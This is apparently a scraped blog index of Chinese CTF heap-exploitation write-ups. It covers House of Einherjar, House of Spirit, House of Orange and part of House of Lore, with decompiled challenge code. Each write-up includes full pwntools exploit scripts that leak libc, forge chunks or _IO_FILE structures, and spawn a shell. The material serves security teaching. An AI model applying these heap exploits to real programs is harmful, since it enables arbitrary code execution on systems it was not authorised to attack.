#0\tadd(0x18,'\\n') #1\tedit(1,p32(0) + p32(free_got) + p32(__libc_start_main_got) + p32(heap_array + 0x10)  + b'\\x00'*8)\tedit(1,p32(puts_plt) + b'\\n')\t#泄露__libc_start_main_got的地址\tdelete(2)\tr(1)\t__libc_start_main_addr = u32(r(4))\tlg('__libc_start_main',__libc_start_main_addr)\t#dbg()\t'''\tlibc = LibcSearcher('__libc_start_main',__libc_start_main_addr)\tlibc_base = __libc_start_main_addr - libc.dump('__libc_start_main')\tsystem_addr = libc_base + libc.dump('system')\tlg('libc_base',(libc_base))\tlg('system_addr',(system_addr))\tedit(1,p32(system_addr) + b'\\n')\t'''\t#本地\tone_gadget = [0x3ac3c,0x3ac3e,0x3ac42,0x3ac49,0x5faa5,0x5faa6]\tlibc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so')\t#buu远程\t#one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]\t#libc = ELF('../../libc-2.23.so--32')\tlibc_base = __libc_start_main_addr - libc.sym['__libc_start_main']\tonegadget = one_gadget[3] + libc_base\tedit(1,p32(onegadget) + b'\\n')\t#getshell\tdelete(1)\titr()main()","categories":["heap"],"tags":["House of 系列"]},{"title":"House of Einherjar","url":"/2023/04/10/House%20of%20Einherjar/","content":"House of Einherjar\n原理\n释放堆块时，unlink后向合并堆块，强制使得 malloc 返回一个几乎任意地址的 chunk 。\nfree 函数中的后向合并核心操作如下\n/* consolidate backward */if (!prev_inuse(p)) {    prevsize = prev_size(p);    size += prevsize;    p = chunk_at_offset(p, -((long) prevsize));    unlink(av, p, bck, fwd);}\n\n后向合并时，新的 chunk 的位置取决于 chunk_at_offset(p, -((long) prevsize))\n\n思路1：两个chunk通过后向unlink直接实现任意地址写\n假设有两个连续的chunk，我们利用低地址的chunk将高地址 chunk 的 prev_size 写为目标地址与当前地址的差值，free后合并，再malloc，就可以申请到目标地址的chunk，实现任意地址写，但是需要在目的 chunk 附近构造相应的 fake chunk，fake_chunk的size字段，必须和chunk_b的pre_size字段一致，为二者之间的偏移量，从而绕过 unlink 的检测。\n思路2：三个chunk通过后向unlink实现double free\nchunk_0  0xD0    # 堆块大小需要保证释放后不进入tcache bin和fastbin，即存在tcache需要先填满对应的tcache chunk_1  0x18    # 堆块大小以8结尾，保证off by null可以覆盖到下一个堆块的prev_inusechunk_2  0xD0    # 堆块大小的最后一个字节必须为00，也就是上一个堆块覆盖prev_inuse后不会影响该堆块的大小chunk_3  0x10    # 堆块大小任意，防止前面的堆块合并到Top chunk中\n申请四个chunk，第四个chunk用来将前三个chunk与top chunk隔开（防止free前三个chunk后与top chunk合并），先free(chunk_0)，利用off-by-null修改第2个chunk的mem，将第三个chunk的的prev_size修改为前两个chunk大小之和，然后free(chunk_2)，将chunk_0,chunk_1,chunk_2合并，之后申请chunk_0大小和chunk_1大小的chunk，再free(chunk_1),free(chunk_5)，实际chunk_1和chunk_5是同一个chunk，从而实现double free。\n例题：\n2016_seccon_tinypad\n\n\n运行程序发现有四个功能：增删改退，分别用a,d,e,q进行操作，并且每次进行一次操作，程序会把每个chunk的内容输出出来，根据ida伪代码发现只能最多申请4个chunk\nida伪代码\n主函数\nint __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // rax  int choice; // eax  int v5; // eax  __int64 v6; // rax  size_t v7; // rax  int c; // [rsp+4h] [rbp-1Ch] BYREF  int i; // [rsp+8h] [rbp-18h]  int index; // [rsp+Ch] [rbp-14h]  int v12; // [rsp+10h] [rbp-10h]  int v13; // [rsp+14h] [rbp-Ch]  unsigned __int64 v14; // [rsp+18h] [rbp-8h]  v14 = __readfsqword(0x28u);  v12 = 0;  write_n(&amp;unk_4019F0, 1uLL);  write_n(    \"  ============================================================================\\n\"    \"// _|_|_|_|_|  _|_|_|  _|      _|  _|      _|  _|_|_|      _|_|    _|_|_|     \\\\\\\\\\n\"    \"||     _|        _|    _|_|    _|    _|  _|    _|    _|  _|    _|  _|    _|   ||\\n\"    \"||     _|        _|    _|  _|  _|      _|      _|_|_|    _|_|_|_|  _|    _|   ||\\n\"    \"||     _|        _|    _|    _|_|      _|      _|        _|    _|  _|    _|   ||\\n\"    \"\\\\\\\\     _|      _|_|_|  _|      _|      _|      _|        _|    _|  _|_|_|     //\\n\"    \"  ============================================================================\\n\",    563uLL);  write_n(&amp;unk_4019F0, 1uLL);  do  {    for ( i = 0; i &lt;= 3; ++i )    {      LOBYTE(c) = i + 49;      writeln(\"+------------------------------------------------------------------------------+\\n\", 81LL);      write_n(\" #   INDEX: \", 12uLL);      writeln(&amp;c, 1LL);      write_n(\" # CONTENT: \", 12uLL);      if ( *&amp;tinypad[16 * i + 264] )      {        v3 = strlen(*&amp;tinypad[16 * i + 264]);        writeln(*&amp;tinypad[16 * i + 264], v3);      }      writeln(&amp;unk_4019F0, 1LL);    }    index = 0;    choice = getcmd();    v12 = choice;    if ( choice == 68 )    {      write_n(\"(INDEX)&gt;&gt;&gt; \", 11uLL);      index = read_int();      if ( index &lt;= 0 || index &gt; 4 )            // 只能申请四个chunk                                                //       {LABEL_29:        writeln(\"Invalid index\", 13LL);        continue;      }      if ( !*&amp;tinypad[16 * index + 240] )      {LABEL_31:        writeln(\"Not used\", 8LL);        continue;      }      free(*&amp;tinypad[16 * index + 248]);      *&amp;tinypad[16 * index + 240] = 0LL;        // size置为0，头指针未置为0      writeln(\"\\nDeleted.\", 9LL);      \t\t\t\t\t//uaf    }    else if ( choice &gt; 0x44 )    {      if ( choice != 0x45 )      {        if ( choice == 81 )          continue;LABEL_41:        writeln(\"No such a command\", 17LL);        continue;      }      write_n(\"(INDEX)&gt;&gt;&gt; \", 11uLL);      index = read_int();      if ( index &lt;= 0 || index &gt; 4 )        goto LABEL_29;      if ( !*&amp;tinypad[16 * index + 240] )        goto LABEL_31;      c = 48;      strcpy(tinypad, *&amp;tinypad[16 * index + 248]);      while ( toupper(c) != 89 )      {        write_n(\"CONTENT: \", 9uLL);        v6 = strlen(tinypad);        writeln(tinypad, v6);        write_n(\"(CONTENT)&gt;&gt;&gt; \", 13uLL);        v7 = strlen(*&amp;tinypad[16 * index + 248]);        read_until(tinypad, v7, 10u);        writeln(\"Is it OK?\", 9LL);        write_n(\"(Y/n)&gt;&gt;&gt; \", 9uLL);        read_until(&amp;c, 1uLL, 10u);      }      strcpy(*&amp;tinypad[16 * index + 248], tinypad);      writeln(\"\\nEdited.\", 8LL);    }    else    {      if ( choice != 65 )        goto LABEL_41;      while ( index &lt;= 3 &amp;&amp; *&amp;tinypad[16 * index + 256] )        ++index;      if ( index == 4 )      {        writeln(\"No space is left.\", 17LL);      }      else      {        v13 = -1;        write_n(\"(SIZE)&gt;&gt;&gt; \", 10uLL);        v13 = read_int();        if ( v13 &lt;= 0 )        {          v5 = 1;        }        else        {          v5 = v13;          if ( v13 &gt; 0x100 )            v5 = 256;        }        v13 = v5;        *&amp;tinypad[16 * index + 256] = v5;        *&amp;tinypad[16 * index + 264] = malloc(v13);        if ( !*&amp;tinypad[16 * index + 264] )        {          writerrln(\"[!] No memory is available.\", 27LL);          exit(-1);        }        write_n(\"(CONTENT)&gt;&gt;&gt; \", 13uLL);        read_until(*&amp;tinypad[16 * index + 264], v13, 10u);        writeln(\"\\nAdded.\", 7LL);      }    }  }  while ( v12 != 81 );  return 0;}\nadd函数\n\n*&amp;tinypad[16 * index + 0x100] = v5;   *&amp;tinypad[16 * index + 264] = malloc(v13);\n存在chunk全局数组，起始地址从0x602040+16*0+0x100=0x602140 开始依次存放chunk的size大小和头指针\nedit函数\n\n该edit函数调用的read_until函数存在off-by-null漏洞\nfree函数\n\nfree函数存在uaf漏洞\n思路\n首先泄露libc和heap地址\n利用 house of einherjar 方法在 tinypad 的前0x100字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。\n这里虽然我们的第一想法可能是直接覆盖 malloc_hook 为 one_gadget 地址，但是，由于当编辑时，程序是利用 strlen 来判读可以读取多少长度，而 malloc_hook 则在初始时为 0。不能覆盖malloc_hook\nv6 = strlen(tinypad);\n可以泄露出environ 的地址，通过gdb调试进而求得存储 main 函数的返回地址的地址，将main 函数的返回地址覆盖为one_gadget来获得shell\n利用过程\n先把前面的代码写好\n# coding=utf-8from pwn import*context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debugsh = process('./tinypad')libc = ELF('//home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims             :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))#定义gdb调试函数def dbg():        gdb.attach(sh)        pause()def add(size, content='a'):    sla('(CMD)&gt;&gt;&gt; ','a')    sla('(SIZE)&gt;&gt;&gt; ',str(size))    sla('(CONTENT)&gt;&gt;&gt; ',content)def edit(idx, content):    sla('(CMD)&gt;&gt;&gt; ','e')    sla('(INDEX)&gt;&gt;&gt; ',str(idx))    sla('(CONTENT)&gt;&gt;&gt; ',content)    sla('Is it OK?\\n','Y')   def free(idx):    sla('(CMD)&gt;&gt;&gt; ','d')    sla('(INDEX)&gt;&gt;&gt; ',str(idx))def exit():    sla('(CMD)&gt;&gt;&gt; ','Q')\n先申请四个chunk，free(3)和free(1),堆块大于0x7f，所以会进入unsorted bin里，chunk是从1开始计数的，此时chunk_1里存放的就是chunk_3的头指针和main_arena+88的地址，chunk_3的头指针前面有两个大小为(0x100+0x10)的chunk，减去(0x100+0x10)*2就是heap的基地址，之后计算出main_arena+88与libc基地址的距离（这个距离是固定的）0x7f19d3ef7b78−0x7f19d3b33000=0x3C4B78\nadd(0x100)add(0x100)add(0x100)add(0x100)free(3)free(1)ru('INDEX: 1')ru('CONTENT: ')heapbase = u64(ru('\\n')[:-1].ljust(8,b'\\x00')) -(0x100+0x10)*2ru('INDEX: 3')ru('CONTENT: ')libcbase = u64(ru('\\n')[:-1].ljust(8,b'\\x00')) - 0x3C4B78environ = libc.sym['environ']+libcbaselg('heapbase',heapbase)lg('libcbase',libcbase)dbg()\n\n在 tinypad 的前0x100字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。\nadd(0x100)add(0x100)#dbg()#四个chunk与top chunk合并free(4)free(1)free(2)free(3)#dbg()#empty now add(0x100,'a'*0x100)edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\\x00'*0x20+p64(0x40))#dbg()free(1)add(0x10) #1add(0xf0) #2add(0x10) #3add(0x100,'a'*0x100) #4\n之后free(1)，再申请0x18大小的chunk_1，利用add函数里自定义的read函数的off-by-null，可以将chunk_2的pre_size改为chunk数组附近0x602070处，再次free(2)，这样利用House of einherjar，可以将free的 chunk转移到0x602070（chunk_2的头指针）处，就可以0x602040（chunk_1的头指针）处形成我们提前构造好的chunk\n#edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\\x00'*0x20+p64(0x40))free(1)target = heapbase+0x20-0x602070add(0x18,b'a'*0x10+p64(target)) #1dbg()\n\n再free（2），编辑chunk_4就相当于在0x602040处的chunk开始编辑，将\nfree(2)edit(4,b'a'*0x30+p64(0)+p64(0x101)+p64(main_arena_88)*2)dbg()\n\n再申请0xf0大小的chunk（实际大小为0x100），此时申请的chunk就在0x602070处，而该chunk的mem区域与chunk全局数组起始地址0x602140相差（0x602140-0x602070+0x10）=0xc0，用字符a填充，之后按照chunk size+头指针依次填充全局数组，将chunk_1改为environ地址，chunk2改为0x602148地址（也就是存放environ地址的地址）\nadd(0xf0,b'a'*0xc0+p64(0x100)+p64(environ)+p64(0x100)+p64(0x602148))ru('INDEX: 1')ru('CONTENT: ')stack= u64(ru('\\n')[:-1].ljust(8,b'\\x00'))target =  -0xF0 + stack lg('stack',stack)lg('target',target)#0x7fc7dd85ff38 &lt;environ&gt;:\t0x00007ffc91b85d58\t0x0000000000000000#1e:00f0│       0x7ffc91b85c68 —▸ 0x7fc7dd4b9830 (__libc_start_main+240) ◂— mov    edi, eax#  0x7ffc91b85c68-0x00007ffc91b85d58=-0xF0dbg()\n\n泄露出来的chunk_1的内容就是栈地址 stack=0x00007ffc91b85d58，在查看栈区main函数返回地址0x7ffc91b85c68，0x7ffc91b85c68-0x00007ffc91b85d58=-0xF0，所以我们要覆盖的main函数返回地址为target = -0xF0 + stack\n刚才我们把chunk_2的mem指向了chunk_1的mem指针，编辑chunk_2为target地址，把chunk_1的mem指针改为target地址，这时再次编辑chunk_1为one_gadget地址，就把target地址存放的main函数返回地址改为了exeve(“/bin/sh\\x00”)，再退出程序，获得shell\nedit(2,p64(target))one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]shell = one_gadget[0] + libcbaseedit(1,p64(shell))exit()itr()\n\nexp\n# coding=utf-8from pwn import*context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debugsh = process('./tinypad')libc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims             :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))#定义gdb调试函数def dbg():        gdb.attach(sh)        pause()def add(size, content='a'):    sla('(CMD)&gt;&gt;&gt; ','a')    sla('(SIZE)&gt;&gt;&gt; ',str(size))    sla('(CONTENT)&gt;&gt;&gt; ',content)def edit(idx, content):    sla('(CMD)&gt;&gt;&gt; ','e')    sla('(INDEX)&gt;&gt;&gt; ',str(idx))    sla('(CONTENT)&gt;&gt;&gt; ',content)    sla('Is it OK?\\n','Y')   def free(idx):    sla('(CMD)&gt;&gt;&gt; ','d')    sla('(INDEX)&gt;&gt;&gt; ',str(idx))def exit():    sla('(CMD)&gt;&gt;&gt; ','Q')\t add(0x100)add(0x100)add(0x100)add(0x100)free(3)free(1)ru('INDEX: 1')ru('CONTENT: ')heapbase = u64(ru('\\n')[:-1].ljust(8,b'\\x00')) -(0x100+0x10)*2ru('INDEX: 3')ru('CONTENT: ')main_arena_88 = u64(ru('\\n')[:-1].ljust(8,b'\\x00')) libcbase = main_arena_88-0x3C4B78environ = libc.sym['environ']+libcbaselg('heapbase',heapbase)lg('libcbase',libcbase)#dbg()add(0x100)add(0x100)#dbg()#四个chunk与top chunk合并free(4)free(1)free(2)free(3)#dbg()#empty now add(0x100,'a'*0x100)edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\\x00'*0x20+p64(0x40))#dbg()free(1)add(0x10) #1add(0xf0) #2add(0x10) #3add(0x100,'a'*0x100) #4#dbg()free(1)#dbg()target = heapbase+0x20-0x602070add(0x18,b'a'*0x10+p64(target)) #1free(2)#dbg()edit(4,b'a'*0x30+p64(0)+p64(0x101)+p64(main_arena_88)*2)#dbg()add(0xf0,b'a'*0xc0+p64(0x100)+p64(environ)+p64(0x100)+p64(0x602148))ru('INDEX: 1')ru('CONTENT: ')stack= u64(ru('\\n')[:-1].ljust(8,b'\\x00'))target =  -0xF0 + stack lg('stack',stack)lg('target',target)#0x7f825ab56f38 &lt;environ&gt;:\t0x00007ffe282d8c28\t0x0000000000000000#00:0000│  0x7ffe282d8b38 —▸ 0x7f825a7b0830 (__libc_start_main+240) ◂— mov    edi, eax#  0x7ffe282d8b38-0x00007ffe282d8c28=-0xF0#dbg()edit(2,p64(target))one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]shell = one_gadget[0] + libcbaseedit(1,p64(shell))exit() itr()","categories":["heap"],"tags":["House of 系列"]},{"title":"House of Spirit","url":"/2023/04/10/House%20of%20Spirit/","content":"该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。\n要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即\nfake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。fake chunk 地址需要对齐， MALLOC_ALIGN_MASKfake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。\n想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测。\n","categories":["heap"],"tags":["House of 系列"]},{"title":"House of Orange","url":"/2023/04/10/House%20of%20Orange/","content":"House of orange\n前提\n题目中不存在 free 函数或其他释放堆块的函数。\n原理\nHouse of Orange 核心就是通过漏洞利用获得 free 的效果。当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。\n利用方法\n1.篡改top chunk size（注意size需要对齐内存页）2.分配比top chunk size大的chunk。3.现在原来的top chunk进入了unsorted bin中，再次malloc就会从unsored bin中切分出需要的大小，剩余部分作新的unsorted bin。\n注意：伪造top chunk size时，必须满足以下要求\n1.伪造的size必须要对齐到内存页。2.size要大于MINSIZE。3.size要小于之后申请的chunk size + MINISIZE。4.size的prev inuse位必须为1。5.malloc的大小不能大于mmap分配阈值。\n例题\nhouseoforange_hitcon_2016\n\n保护全开，打开ida\nmain函数\nvoid __fastcall __noreturn main(const char *a1, char **a2, char **a3){  int choice; // eax  sub_1218();  while ( 1 )  {    while ( 1 )    {      menu();      choice = my_read(a1, a2);      if ( choice != 2 )        break;      show();    }    if ( choice &gt; 2 )    {      if ( choice == 3 )      {        edit();      }      else      {        if ( choice == 4 )        {          puts(\"give up\");          exit(0);        }LABEL_13:        a1 = \"Invalid choice\";        puts(\"Invalid choice\");      }    }    else    {      if ( choice != 1 )        goto LABEL_13;      add();    }  }}\nadd函数\n会申请三个chunk，chunk_1存放chunk_2和chunk_3的mem指针，chunk_2存放name，chunk_3存放price和color。由于num2的限制，只能使用4次add函数。\nint add(){  unsigned int size; // [rsp+8h] [rbp-18h]  int color; // [rsp+Ch] [rbp-14h]  _QWORD *v3; // [rsp+10h] [rbp-10h]  _DWORD *v4; // [rsp+18h] [rbp-8h]  if ( num2 &gt; 3u )                              // num开始为0，可利用add4次  {    puts(\"Too many house\");    exit(1);  }  v3 = malloc(0x10uLL);   //chunk_1  printf(\"Length of name :\");  size = my_read();  if ( size &gt; 0x1000 )    size = 0x1000;  v3[1] = malloc(size);     //chunk_2  if ( !v3[1] )  {    puts(\"Malloc error !!!\");    exit(1);  }  printf(\"Name :\");  my_read2((void *)v3[1], size);  v4 = calloc(1uLL, 8uLL);      //chunk_3  printf(\"Price of Orange:\");  *v4 = my_read();  ::color();  printf(\"Color of Orange:\");  color = my_read();  if ( color != 0xDDAA &amp;&amp; (color &lt;= 0 || color &gt; 7) )  {    puts(\"No such color\");    exit(1);  }  if ( color == 0xDDAA )    v4[1] = 0xDDAA;  else    v4[1] = color + 30;  *v3 = v4;  heap_array = v3;  ++num2;  return puts(\"Finish\");}\nshow函数\nint sub_EE6(){  int v0; // eax  int v2; // eax  if ( !heap_array )    return puts(\"No such house !\");  if ( *(_DWORD *)(*heap_array + 4LL) == 0xDDAA )  {    printf(\"Name of house : %s\\n\", (const char *)heap_array[1]);    printf(\"Price of orange : %d\\n\", *(unsigned int *)*heap_array);    v0 = rand();    return printf(\"\\x1B[01;38;5;214m%s\\x1B[0m\\n\", *((const char **)&amp;unk_203080 + v0 % 8));  }  else  {    if ( *(int *)(*heap_array + 4LL) &lt;= 30 || *(int *)(*heap_array + 4LL) &gt; 37 )    {      puts(\"Color corruption!\");      exit(1);    }    printf(\"Name of house : %s\\n\", (const char *)heap_array[1]);    printf(\"Price of orange : %d\\n\", *(unsigned int *)*heap_array);    v2 = rand();    return printf(\"\\x1B[%dm%s\\x1B[0m\\n\", *(unsigned int *)(*heap_array + 4LL), *((const char **)&amp;unk_203080 + v2 % 8));  }}\nedit函数\n存在漏洞，修改chunk时的size大小由我们自己修改，可造成堆溢出，修改下一个chunk的内容，edit函数有num作为限制，只能使用3次\nint sub_107C(){  _DWORD *v1; // rbx  unsigned int size; // [rsp+8h] [rbp-18h]  int v3; // [rsp+Ch] [rbp-14h]  if ( num &gt; 2u )                               // num开始为0，可利用edit3次    return puts(\"You can't upgrade more\");  if ( !heap_array )    return puts(\"No such house !\");  printf(\"Length of name :\");  size = my_read();  if ( size &gt; 0x1000 )    size = 4096;  printf(\"Name:\");                              // size由我们输入，存在溢出  my_read2((void *)heap_array[1], size);  printf(\"Price of Orange: \");  v1 = (_DWORD *)*heap_array;  *v1 = my_read();  color();  printf(\"Color of Orange: \");  v3 = my_read();  if ( v3 != 0xDDAA &amp;&amp; (v3 &lt;= 0 || v3 &gt; 7) )  {    puts(\"No such color\");    exit(1);  }  if ( v3 == 0xDDAA )    *(_DWORD *)(*heap_array + 4LL) = 0xDDAA;  else    *(_DWORD *)(*heap_array + 4LL) = v3 + 30;  ++num;  return puts(\"Finish\");}\n分析\n程序不存在free函数，而按照我们的一般思路都是先free一个大于0x7f的chunk，进入unsortedbin，获得libc基地址，之后覆盖hook函数为system函数获得shell。而这道题不能这样做，add和edit函数的使用次数也有限制，这道题的edit函数存在堆溢出，可以考虑使用House of orange，通过修改top chunk为一个比较小的值，然后分配一个很大的chunk，使top chunk进入unsortedbin，从而泄露libc，这样heap基地址也能泄露出来，之后的话，可以使用FSOP，获得shell。\n过程\n先把前面的写好\n# coding=utf-8from pwn import  * context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug binary = './houseoforange_hitcon_2016'  #sh = process(binary) #连接本地程序sh = remote('node4.buuoj.cn',26188) #连接远程程序elf = ELF(binary)     libc = ELF('../../libc-2.23.so--64')  #libc-2.23.so--64one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]one_gadget[0] = 0x45216s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims  :sh.recvuntil(delims )itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg=lambda address,data:log.success('%s: '%(address)+hex(data))#定义gdb调试函数def dbg():        gdb.attach(sh)        pause()def add(size, content, price='2', color='1'):    ru(\"Your choice : \")    sl('1')    ru(\"Length of name :\")    sl(str(size))    ru(\"Name :\")    sh.send(content)    ru(\"Price of Orange:\")    sl(str(price))    ru(\"Color of Orange:\")    #1-7    sl(str(color))def show():    ru(\"Your choice : \")    sl('2')def edit(size, content, price='2', color='1'):    ru(\"Your choice : \")    sl('3')    ru(\"Length of name :\")    sl(str(size))    ru(\"Name:\")    sh.send(content)    ru(\"Price of Orange:\")    sl(str(price))    ru(\"Color of Orange:\")    #1-7    sl(str(color))\n修改top chunk\n随便申请一个chunk，然后利用edit函数，溢出修改topchunk\nadd(0x30,'aaaa\\n')dbg()payload = 'a' * 0x30 +p64(0) + p64(0x21) + p32(2) + p32(2) + p64(0) * 2 + p64(0xf81)edit(len(payload), payload)dbg()\n\ntop chunk大小为0x0000000000020f81\n修改后的top chunk 大小为0x0000000000000f81\n申请大于top chunk的chunk，进入unsortedbin\nadd(0x1000, 'a\\n')dbg()\n\n泄露libc和heap\n调试可得此时我们刚刚申请的0x400chunk里存放着0x00007fe0c1216188距离libc基地址0x3c5188（0x00007fe0c1216188-0x7fe0c0e51000），该chunk里还存放着heap地址，因为printf遇到’\\x00’会停止打印，所以我们将0x00007fe0c1216188改为字符串b，再将其输出\nadd(0x400, 'a' * 8)show()ru('a'*8)libc.address = u64(ru('\\x7f').ljust(8, '\\x00')) - 0x3c5188lg('libc.address',libc.address)io_list_all = libc.symbols['_IO_list_all']system = libc.symbols['system']dbg()\n\n我们泄露出的heap为0x5617117b30e0，距离heap基地址0x5617117b30e0-0x5617117b3000=0xe0，由此可获得heap_base地址\npayload = 'b' * 0x10edit(0x10, payload)show()ru('b'*0x10)heap = u64(sh.recvuntil('\\n').strip().ljust(8, '\\x00'))heap_base = heap - 0xE0lg('heap_base',heap_base)dbg()\n\n构造fake_file\n接下来我们修改当前unsortedbin中chunk的大小和内容,这里FSOP还不太明白，先借用一下大佬写的解释\nmalloc时，对unsorted bin进行判断，此时该chunk的size为0x60，不满足要求，就把该chunk放入small bin，并且向bk-&gt;fd写入main_arena+0x58，即向_IO_list_all写入main_arena+0x58，此时判断下一个unsorted bin（_IO_list_all），而这里实际上没有chunk，此时会触发错误，此时第一个_IO_FILE_plus结构体为main_arena+0x58，而它不满足条件，就通过_chain调到下一个_IO_FILE_plus结构体，_chain位于0x68偏移的地方，main_arena+0x58+0x68=main_arena+0xc0，就是small bin中0x60大小的地方，这就回到了我们伪造的_IO_FILE_plus结构体\ndbg()payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)fake_file = '/bin/sh\\x00'+p64(0x61)#to small binfake_file += p64(0)+p64(io_list_all-0x10)fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptrfake_file = fake_file.ljust(0xc0,'\\x00')fake_file += p64(0) * 3fake_file += p64(heap_base+0x5E8) #vtable ptrfake_file += p64(0) * 2fake_file += p64(system)payload += fake_fileedit(len(payload), payload)dbg()\n修改前\n修改后\n之后我们再调用add函数，调用malloc函数，就可以产生错误信息，改变程序执行流程，获得shell\nru(\"Your choice : \")sl('1')itr()\nexp\n# coding=utf-8from pwn import  * context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug binary = './houseoforange_hitcon_2016'  #sh = process(binary) #连接本地程序sh = remote('node4.buuoj.cn',26188) #连接远程程序elf = ELF(binary)     libc = ELF('../../libc-2.23.so--64')  #libc-2.23.so--64one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]one_gadget[0] = 0x45216s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims  :sh.recvuntil(delims )itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg=lambda address,data:log.success('%s: '%(address)+hex(data))#定义gdb调试函数def dbg():        gdb.attach(sh)        pause()def add(size, content, price='2', color='1'):    ru(\"Your choice : \")    sl('1')    ru(\"Length of name :\")    sl(str(size))    ru(\"Name :\")    sh.send(content)    ru(\"Price of Orange:\")    sl(str(price))    ru(\"Color of Orange:\")    #1-7    sl(str(color))def show():    ru(\"Your choice : \")    sl('2')def edit(size, content, price='2', color='1'):    ru(\"Your choice : \")    sl('3')    ru(\"Length of name :\")    sl(str(size))    ru(\"Name:\")    sh.send(content)    ru(\"Price of Orange:\")    sl(str(price))    ru(\"Color of Orange:\")    #1-7    sl(str(color))add(0x30,'aaaa\\n')#dbg()payload = 'a' * 0x30 +p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0) * 2 + p64(0xf81) edit(len(payload), payload)#dbg()add(0x1000, 'a\\n')#dbg()add(0x400, 'a' * 8)#dbg()show()ru('a'*8)libc.address = u64(ru('\\x7f').ljust(8, '\\x00')) - 0x3c5188lg('libc.address',libc.address)  io_list_all = libc.symbols['_IO_list_all']system = libc.symbols['system']payload = 'b' * 0x10 edit(0x10, payload)show()ru('b'*0x10)heap = u64(sh.recvuntil('\\n').strip().ljust(8, '\\x00'))heap_base = heap - 0xE0lg('heap_base',heap_base)#dbg() payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)fake_file = '/bin/sh\\x00'+p64(0x61)#to small binfake_file += p64(0)+p64(io_list_all-0x10)fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptrfake_file = fake_file.ljust(0xc0,'\\x00')fake_file += p64(0) * 3fake_file += p64(heap_base+0x5E8) #vtable ptrfake_file += p64(0) * 2fake_file += p64(system)payload += fake_fileedit(len(payload), payload)#dbg() ru(\"Your choice : \")sl('1')itr()\n可能因为本地环境没配好，打不通，在buu上远程可以打通\n\n参考文章\nhouseoforange_hitcon_2016\nhouseoforange_hitcon_2016\n\n","categories":["heap"],"tags":["House of 系列"]},{"title":"House of Lore","url":"/2023/04/10/House%20of%20Lore/","content":"如果从fastbins中malloc-一个freechunk时，glibc会做以下两个检测：\nTcache Stashing Unlink Attack利用了House of Lore的一些手段，两者都是利用了small bin\nHouse of Lore\n\nHouse of Lore 攻击与 Glibc 堆管理中的 Small Bin 